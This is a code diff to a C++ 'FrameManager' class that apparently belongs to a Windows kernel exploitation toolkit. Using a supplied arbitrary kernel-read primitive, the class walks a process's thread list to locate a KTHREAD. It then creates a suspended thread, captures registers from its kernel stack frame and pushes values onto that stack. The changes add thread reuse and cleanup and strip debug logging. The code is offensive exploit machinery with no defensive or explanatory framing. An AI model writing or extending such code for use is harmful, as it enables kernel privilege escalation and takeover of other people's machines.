@@ -5,7 +5,7 @@
 
 
 FrameManager::FrameManager()
-    : threadHandle(nullptr), threadId(0), frameAddress(0), kthreadAddress(0), eprocess(0)
+    : threadHandle(nullptr), threadId(0), frameAddress(0), kthreadAddress(0), eprocess(0), threadReady(false)
 {}
 
 void FrameManager::SetReadPrimitive(std::function<void(UINT64*, UINT64, UINT64)> fn) {
@@ -49,9 +49,6 @@ UINT64 FrameManager::FindKthread() {
     UINT64 flink = 0;
     readFn(&flink, listHead, sizeof(UINT64));
 
-    DbgLog("[FindKthread] EPROCESS=0x%llX ThreadListHead=0x%llX flink=0x%llX tid=%lu\n",
-        eprocess, listHead, flink, threadId);
-
 
     UINT64 current = flink;
     for (int i = 0; i < 4096; i++) {
@@ -70,7 +67,6 @@ UINT64 FrameManager::FindKthread() {
         readFn(&tid, ethread + OFF_CID_UNIQUE_THREAD, sizeof(UINT64));
 
         if ((DWORD)tid == threadId) {
-            DbgLog("[FindKthread] Found KTHREAD=0x%llX for tid=%lu\n", ethread, threadId);
             kthreadAddress = ethread;
             return ethread;
         }
@@ -90,6 +86,8 @@ UINT64 FrameManager::FindKthread() {
 }
 
 void FrameManager::CreateFrozenThread() {
+    if (threadReady) return; // reuse existing thread and frame
+
     DWORD dwTid = 0;
     threadHandle = CreateThread(NULL, 0, DummyThreadProc, NULL, CREATE_SUSPENDED, &dwTid);
 
@@ -98,9 +96,9 @@ void FrameManager::CreateFrozenThread() {
         return;
     }
     threadId = dwTid;
-    DbgLog("[CreateFrozenThread] Thread created tid=%lu handle=0x%p, sleeping 50ms\n", dwTid, threadHandle);
-    Sleep(50);
+    DbgLog("[CreateFrozenThread] tid=%lu\n", dwTid);
     StoreFrame();
+    if (frameAddress) threadReady = true;
 }
 
 void FrameManager::StoreFrame() {
@@ -150,12 +148,19 @@ void FrameManager::StoreFrame() {
         readFn(&val, regAddr, sizeof(UINT64));
         storedRegisters[reg] = val;
     }
-	DbgLog("[StoreFrame] captured %zu registers from frame=0x%llX\n", storedRegisters.size(), frameAddress);
+    DbgLog("[StoreFrame] frame=0x%llX kthread=0x%llX\n", frameAddress, kthreadAddress);
 }
 
 void FrameManager::ContinueThread() {
-    if (threadHandle)
+    if (threadHandle) {
         ResumeThread(threadHandle);
+        CloseHandle(threadHandle);
+        threadHandle = nullptr;
+        threadId     = 0;
+        frameAddress = 0;
+        kthreadAddress = 0;
+        threadReady  = false;
+    }
 }
 
 void FrameManager::PushStack(UINT64 value) {
